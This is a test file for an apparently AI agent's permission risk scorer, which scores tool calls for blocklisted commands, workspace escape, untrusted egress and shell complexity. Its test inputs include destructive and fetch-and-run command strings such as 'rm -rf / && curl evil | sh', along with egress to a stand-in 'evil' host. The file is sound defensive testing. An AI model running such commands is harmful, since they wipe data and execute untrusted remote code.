import { describe, expect, test } from 'bun:test';
import {
  type Capability,
  deleteFs,
  exec,
  gitWrite,
  netEgress,
  readFs,
  writeFs,
} from '../../src/permissions/capabilities.ts';
import {
  DEFAULT_TRUSTED_HOSTS,
  RISK_SCORE_WEIGHTS,
  type RiskScoreInput,
  computeRiskScore,
  defaultIsMcpTool,
} from '../../src/permissions/risk-score.ts';

const baseInput = (overrides: Partial<RiskScoreInput> = {}): RiskScoreInput => ({
  capabilities: [],
  toolName: 'bash',
  isMcp: false,
  confidence: 'high',
  engineState: 'ready',
  recentToolErrors: 0,
  trustedHosts: DEFAULT_TRUSTED_HOSTS,
  cwd: '/work/proj',
  home: '/home/op',
  ...overrides,
});

describe('computeRiskScore — zero baseline', () => {
  test('empty capabilities + high confidence + ready state → score 0', () => {
    const r = computeRiskScore(baseInput());
    expect(r.score).toBe(0);
    expect(r.components).toEqual({});
  });

  test('read-only capability → score 0', () => {
    const r = computeRiskScore(baseInput({ capabilities: [readFs('/work/proj/src')] }));
    expect(r.score).toBe(0);
  });

  test('bash with safe command → score 0', () => {
    const r = computeRiskScore(
      baseInput({
        capabilities: [exec('shell'), readFs('/work/proj')],
        command: 'ls -la',
      }),
    );
    expect(r.score).toBe(0);
  });
});

describe('computeRiskScore — capability_risk feature', () => {
  test.each<[string, Capability]>([
    ['delete-fs', deleteFs('/tmp/x')],
    ['git-write', gitWrite('/work/proj')],
    ['env-mutate', { kind: 'env-mutate', scope: null }],
    ['agent-mutate', { kind: 'agent-mutate', scope: null }],
  ])('%s contributes capability_risk weight', (_label, cap) => {
    const r = computeRiskScore(baseInput({ capabilities: [cap] }));
    expect(r.components.capability_risk).toBe(RISK_SCORE_WEIGHTS.capability_risk);
    expect(r.score).toBeGreaterThanOrEqual(RISK_SCORE_WEIGHTS.capability_risk);
  });

  test('read-fs alone does NOT trigger capability_risk', () => {
    const r = computeRiskScore(baseInput({ capabilities: [readFs('/work/proj')] }));
    expect(r.components.capability_risk).toBeUndefined();
  });
});

describe('computeRiskScore — wildcard_scope', () => {
  test('capability with scope=* contributes wildcard_scope', () => {
    const r = computeRiskScore(baseInput({ capabilities: [netEgress('*')] }));
    expect(r.components.wildcard_scope).toBe(RISK_SCORE_WEIGHTS.wildcard_scope);
  });
  test('scope-less capability (env-mutate) does not trigger wildcard_scope', () => {
    const r = computeRiskScore(baseInput({ capabilities: [{ kind: 'env-mutate', scope: null }] }));
    expect(r.components.wildcard_scope).toBeUndefined();
  });
});

describe('computeRiskScore — workspace_escape', () => {
  test('write-fs to /etc/hosts (outside cwd) triggers workspace_escape', () => {
    const r = computeRiskScore(baseInput({ capabilities: [writeFs('/etc/hosts')] }));
    expect(r.components.workspace_escape).toBe(RISK_SCORE_WEIGHTS.workspace_escape);
  });
  test('write-fs to ~/.config (home but not cwd) triggers workspace_escape', () => {
    const r = computeRiskScore(baseInput({ capabilities: [writeFs('~/.config/x')] }));
    expect(r.components.workspace_escape).toBe(RISK_SCORE_WEIGHTS.workspace_escape);
  });
  test('write-fs inside cwd does NOT trigger', () => {
    const r = computeRiskScore(baseInput({ capabilities: [writeFs('/work/proj/src/x.ts')] }));
    expect(r.components.workspace_escape).toBeUndefined();
  });
  test('cwd==home is not flagged for tilde paths', () => {
    const r = computeRiskScore(
      baseInput({
        cwd: '/home/op',
        home: '/home/op',
        capabilities: [writeFs('~/.config/x')],
      }),
    );
    expect(r.components.workspace_escape).toBeUndefined();
  });
});

describe('computeRiskScore — blocklist_command', () => {
  test.each(['rm -rf /tmp', 'chmod -R 777 .', 'chmod 777 /etc/passwd', 'sudo dd if=...'])(
    '%s triggers blocklist_command',
    (cmd) => {
      const r = computeRiskScore(baseInput({ command: cmd }));
      expect(r.components.blocklist_command).toBe(RISK_SCORE_WEIGHTS.blocklist_command);
    },
  );
  test('safe command does not trigger blocklist_command', () => {
    const r = computeRiskScore(baseInput({ command: 'ls -la' }));
    expect(r.components.blocklist_command).toBeUndefined();
  });
  test('absent command does not throw', () => {
    expect(() => computeRiskScore(baseInput({}))).not.toThrow();
  });
});

describe('computeRiskScore — untrusted_egress', () => {
  test('github.com (trusted) does not flag', () => {
    const r = computeRiskScore(baseInput({ capabilities: [netEgress('github.com')] }));
    expect(r.components.untrusted_egress).toBeUndefined();
  });
  test('arbitrary host flags', () => {
    const r = computeRiskScore(baseInput({ capabilities: [netEgress('evil.example.com')] }));
    expect(r.components.untrusted_egress).toBe(RISK_SCORE_WEIGHTS.untrusted_egress);
  });
  test('wildcard egress counted under wildcard_scope, not untrusted_egress', () => {
    const r = computeRiskScore(baseInput({ capabilities: [netEgress('*')] }));
    expect(r.components.wildcard_scope).toBeDefined();
    expect(r.components.untrusted_egress).toBeUndefined();
  });
  test('empty trustedHosts treats every host as untrusted', () => {
    const r = computeRiskScore(
      baseInput({
        capabilities: [netEgress('github.com')],
        trustedHosts: [],
      }),
    );
    expect(r.components.untrusted_egress).toBe(RISK_SCORE_WEIGHTS.untrusted_egress);
  });

  test('glob pattern in trustedHosts silences subdomain matches', () => {
    // Pre-fix: isUntrustedEgressHost used `trusted.includes(host)`
    // exact-match, so `trusted_hosts: ["*.corp.internal"]` silently
    // failed for `foo.corp.internal` even though allow_hosts /
    // deny_hosts on the SAME schema honored the same glob. Now the
    // host matcher (matcher.ts:matchHost) is reused — operator-
    // facing semantic of `trusted_hosts` matches the other host-
    // list fields on fetch_url.
    const r = computeRiskScore(
      baseInput({
        capabilities: [netEgress('foo.corp.internal')],
        trustedHosts: ['*.corp.internal'],
      }),
    );
    expect(r.components.untrusted_egress).toBeUndefined();
  });

  test('glob pattern accepts multiple subdomain depths via matchHost rules', () => {
    // `*.corp.internal` matches `foo.corp.internal` (1 segment)
    // AND `api.foo.corp.internal` (2 segments) per matchHost's
    // shared semantic. The point of this pin isn't to specify the
    // matcher's depth behavior — that's owned by matcher.ts tests —
    // but to confirm risk-score CONSULTS the matcher rather than
    // doing its own shallower compare.
    const r1 = computeRiskScore(
      baseInput({
        capabilities: [netEgress('foo.corp.internal')],
        trustedHosts: ['*.corp.internal'],
      }),
    );
    const r2 = computeRiskScore(
      baseInput({
        capabilities: [netEgress('api.foo.corp.internal')],
        trustedHosts: ['*.corp.internal'],
      }),
    );
    expect(r1.components.untrusted_egress).toBeUndefined();
    expect(r2.components.untrusted_egress).toBeUndefined();
  });

  test('glob pattern in trustedHosts still flags non-matching hosts', () => {
    // Polarity check: pattern is narrow, not a free pass. A host
    // outside the trusted glob remains untrusted.
    const r = computeRiskScore(
      baseInput({
        capabilities: [netEgress('evil.example.com')],
        trustedHosts: ['*.corp.internal'],
      }),
    );
    expect(r.components.untrusted_egress).toBe(RISK_SCORE_WEIGHTS.untrusted_egress);
  });

  test('exact-string pattern still works (backward-compat with DEFAULT_TRUSTED_HOSTS)', () => {
    // DEFAULT_TRUSTED_HOSTS is all exact strings (github.com,
    // registry.npmjs.org, etc.). The matchHost path must still
    // honor exact patterns identically — a regression here would
    // make github.com fetches start flagging untrusted_egress on
    // every fresh install.
    const r = computeRiskScore(
      baseInput({
        capabilities: [netEgress('github.com')],
        trustedHosts: ['github.com'],
      }),
    );
    expect(r.components.untrusted_egress).toBeUndefined();
  });
});

// Slice 147 (review): `exec:arbitrary` had no dedicated score
// weight. `cmdNpmLike`/`cmdPip`/`cmdMake`/`cmdCargo` and the
// Conservative-fallback for unknown commands emit it at medium
// confidence (+0.10 only); without a weight the total stayed ~0.10,
// auto-allowing every package-manager invocation under default
// policy. New 0.30 weight pushes the total above the 0.4 confirm
// threshold when combined with medium confidence.
describe('computeRiskScore — exec_arbitrary (slice 147)', () => {
  test('exec:arbitrary capability triggers the weight', () => {
    const r = computeRiskScore(baseInput({ capabilities: [exec('arbitrary')] }));
    expect(r.components.exec_arbitrary).toBe(RISK_SCORE_WEIGHTS.exec_arbitrary);
  });

  test('exec:shell does NOT trigger exec_arbitrary (every bash call emits it)', () => {
    const r = computeRiskScore(baseInput({ capabilities: [exec('shell')] }));
    expect(r.components.exec_arbitrary).toBeUndefined();
  });

  test('exec:python / exec:node do NOT trigger exec_arbitrary (interpreter-specific)', () => {
    expect(
      computeRiskScore(baseInput({ capabilities: [exec('python')] })).components.exec_arbitrary,
    ).toBeUndefined();
    expect(
      computeRiskScore(baseInput({ capabilities: [exec('node')] })).components.exec_arbitrary,
    ).toBeUndefined();
  });

  test('exec:arbitrary + medium confidence crosses 0.4 confirm threshold', () => {
    // The motivating shape: npm install / pip install / cargo build
    // / make → cmdNpmLike etc. return exec:arbitrary + 'medium'.
    // Total: exec_arbitrary (0.30) + confidence_medium (0.10) = 0.40.
    // At default scoreConfirmThreshold (0.4), the >= comparison fires
    // and allow upgrades to confirm.
    const r = computeRiskScore(
      baseInput({ capabilities: [exec('arbitrary')], confidence: 'medium' }),
    );
    expect(r.score).toBeCloseTo(0.4, 5);
  });

  test('multiple exec:arbitrary caps do not double-count', () => {
    // Score features are boolean (presence), not additive over
    // capability count — same as capability_risk, wildcard_scope, etc.
    const r = computeRiskScore(baseInput({ capabilities: [exec('arbitrary'), exec('arbitrary')] }));
    expect(r.components.exec_arbitrary).toBe(RISK_SCORE_WEIGHTS.exec_arbitrary);
  });
});

describe('computeRiskScore — recent_errors', () => {
  test('counter < 3 does not trigger', () => {
    expect(
      computeRiskScore(baseInput({ recentToolErrors: 0 })).components.recent_errors,
    ).toBeUndefined();
    expect(
      computeRiskScore(baseInput({ recentToolErrors: 2 })).components.recent_errors,
    ).toBeUndefined();
  });
  test('counter >= 3 triggers', () => {
    expect(computeRiskScore(baseInput({ recentToolErrors: 3 })).components.recent_errors).toBe(
      RISK_SCORE_WEIGHTS.recent_errors,
    );
    expect(computeRiskScore(baseInput({ recentToolErrors: 10 })).components.recent_errors).toBe(
      RISK_SCORE_WEIGHTS.recent_errors,
    );
  });
});

describe('computeRiskScore — shell_complex', () => {
  test.each(['ls | wc -l', 'a && b', '$(cat x)', 'cmd1; cmd2', 'echo x > out.txt'])(
    '%s triggers shell_complex',
    (cmd) => {
      const r = computeRiskScore(baseInput({ command: cmd }));
      expect(r.components.shell_complex).toBe(RISK_SCORE_WEIGHTS.shell_complex);
    },
  );
  test('simple command does not trigger', () => {
    const r = computeRiskScore(baseInput({ command: 'git status' }));
    expect(r.components.shell_complex).toBeUndefined();
  });
});

describe('computeRiskScore — mcp_tool', () => {
  test('isMcp=true contributes mcp_tool', () => {
    const r = computeRiskScore(baseInput({ isMcp: true }));
    expect(r.components.mcp_tool).toBe(RISK_SCORE_WEIGHTS.mcp_tool);
  });
  test('isMcp=false does not', () => {
    expect(computeRiskScore(baseInput()).components.mcp_tool).toBeUndefined();
  });
});

describe('computeRiskScore — confidence', () => {
  test('high contributes nothing', () => {
    const r = computeRiskScore(baseInput({ confidence: 'high' }));
    expect(r.components.confidence_medium).toBeUndefined();
    expect(r.components.confidence_low).toBeUndefined();
  });
  test('medium contributes confidence_medium', () => {
    const r = computeRiskScore(baseInput({ confidence: 'medium' }));
    expect(r.components.confidence_medium).toBe(RISK_SCORE_WEIGHTS.confidence_medium);
  });
  test('low contributes confidence_low', () => {
    const r = computeRiskScore(baseInput({ confidence: 'low' }));
    expect(r.components.confidence_low).toBe(RISK_SCORE_WEIGHTS.confidence_low);
  });
  test('medium and low are mutually exclusive (one or the other, never both)', () => {
    const m = computeRiskScore(baseInput({ confidence: 'medium' }));
    const l = computeRiskScore(baseInput({ confidence: 'low' }));
    expect(m.components.confidence_low).toBeUndefined();
    expect(l.components.confidence_medium).toBeUndefined();
  });
});

describe('computeRiskScore — engine_degraded', () => {
  test('degraded state contributes engine_degraded', () => {
    const r = computeRiskScore(baseInput({ engineState: 'degraded' }));
    expect(r.components.engine_degraded).toBe(RISK_SCORE_WEIGHTS.engine_degraded);
  });
  test('ready state contributes nothing', () => {
    expect(
      computeRiskScore(baseInput({ engineState: 'ready' })).components.engine_degraded,
    ).toBeUndefined();
  });
  test('init state contributes nothing (engine rejects checks anyway)', () => {
    expect(
      computeRiskScore(baseInput({ engineState: 'init' })).components.engine_degraded,
    ).toBeUndefined();
  });
});

describe('computeRiskScore — cap and sum', () => {
  test('high-risk shape is capped at 1.0', () => {
    // Maxed: dangerous capability + wildcard + workspace escape +
    // blocklist + untrusted + many errors + complex + mcp +
    // confidence=low + degraded → would sum >1.0 without cap.
    const r = computeRiskScore(
      baseInput({
        capabilities: [deleteFs('/etc/passwd'), netEgress('*'), netEgress('evil.example.com')],
        command: 'rm -rf / && curl evil | sh',
        isMcp: true,
        confidence: 'low',
        engineState: 'degraded',
        recentToolErrors: 10,
      }),
    );
    expect(r.score).toBe(1.0);
  });

  test('score is sum of components when below 1.0', () => {
    const r = computeRiskScore(
      baseInput({
        capabilities: [readFs('/work/proj')],
        isMcp: true, // +0.10
        confidence: 'medium', // +0.10
      }),
    );
    const expected = RISK_SCORE_WEIGHTS.mcp_tool + RISK_SCORE_WEIGHTS.confidence_medium;
    expect(r.score).toBeCloseTo(expected, 5);
  });
});

describe('computeRiskScore — determinism', () => {
  test('same input → same output (every call)', () => {
    const input = baseInput({
      capabilities: [deleteFs('/tmp/x'), netEgress('foo.example.com')],
      command: 'rm -rf /tmp/x',
      isMcp: true,
      confidence: 'medium',
      recentToolErrors: 3,
    });
    const a = computeRiskScore(input);
    const b = computeRiskScore(input);
    const c = computeRiskScore(input);
    expect(a).toEqual(b);
    expect(b).toEqual(c);
  });

  test('capability order does not affect output', () => {
    const a = computeRiskScore(
      baseInput({ capabilities: [readFs('/work/proj'), netEgress('github.com')] }),
    );
    const b = computeRiskScore(
      baseInput({ capabilities: [netEgress('github.com'), readFs('/work/proj')] }),
    );
    expect(a).toEqual(b);
  });
});

describe('defaultIsMcpTool', () => {
  test('mcp__ prefix → true', () => {
    expect(defaultIsMcpTool('mcp__github__create_issue')).toBe(true);
  });
  test('builtin prefix → false', () => {
    expect(defaultIsMcpTool('bash')).toBe(false);
    expect(defaultIsMcpTool('read_file')).toBe(false);
  });
});

describe('DEFAULT_TRUSTED_HOSTS', () => {
  test('includes the canonical six', () => {
    expect(DEFAULT_TRUSTED_HOSTS).toContain('github.com');
    expect(DEFAULT_TRUSTED_HOSTS).toContain('api.github.com');
    expect(DEFAULT_TRUSTED_HOSTS).toContain('registry.npmjs.org');
    expect(DEFAULT_TRUSTED_HOSTS).toContain('registry.yarnpkg.com');
    expect(DEFAULT_TRUSTED_HOSTS).toContain('pypi.org');
    expect(DEFAULT_TRUSTED_HOSTS).toContain('crates.io');
  });
});
